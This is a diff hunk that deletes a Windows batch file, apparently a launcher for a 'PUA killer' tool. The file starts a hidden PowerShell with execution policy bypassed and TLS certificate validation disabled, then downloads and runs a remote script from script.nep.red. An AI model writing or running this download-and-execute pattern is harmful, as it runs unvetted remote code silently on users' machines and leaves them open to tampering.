@@ -1,7 +1,0 @@
-@echo off
-setlocal
-set "DBG=%TEMP%\PUAKILLER.log"
->"%DBG%" echo [start] %DATE% %TIME% user=%USERNAME% host=%COMPUTERNAME%
-start "" /min powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ErrorActionPreference='Stop'; $d='%DBG%'; function W($m){Add-Content -LiteralPath $d ([string]$m)}; W('[ps] '+$PSVersionTable.PSVersion); foreach($h in @('script.nep.red','www.google.com')){ try{ W('[dns '+$h+'] '+(([Net.Dns]::GetHostAddresses($h)).IPAddressToString -join ',')) }catch{ W('[dns '+$h+'] ERR '+$_.Exception.Message) }; try{ $r=Test-NetConnection -ComputerName $h -Port 443 -WarningAction SilentlyContinue; W('[tcp443 '+$h+'] '+$r.TcpTestSucceeded) }catch{ W('[tcp443 '+$h+'] ERR') } }; try{ W('[winhttp] '+((netsh winhttp show proxy) -join ' | ')) }catch{}; try { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]'Tls12,Tls11,Tls'; try { Add-Type 'using System.Net;using System.Security.Cryptography.X509Certificates;using System.Net.Security;public static class CB{public static void On(){ServicePointManager.ServerCertificateValidationCallback=delegate(object a,X509Certificate b,X509Chain c,SslPolicyErrors e){return true;};}}' 2>$null; [CB]::On() } catch {}; $ip=@{Uri='https://script.nep.red';TimeoutSec=20}; if((Get-Command Invoke-RestMethod).Parameters.ContainsKey('SkipCertificateCheck')){$ip['SkipCertificateCheck']=$true}; $sb=irm @ip; W('[dl] ok len='+$sb.Length); & ([scriptblock]::Create($sb)) -Headless -NoElevate -Harden *>$null; W('[done] ok') } catch { W('[err] '+$_.Exception.Message) }"
-endlocal
-exit /b
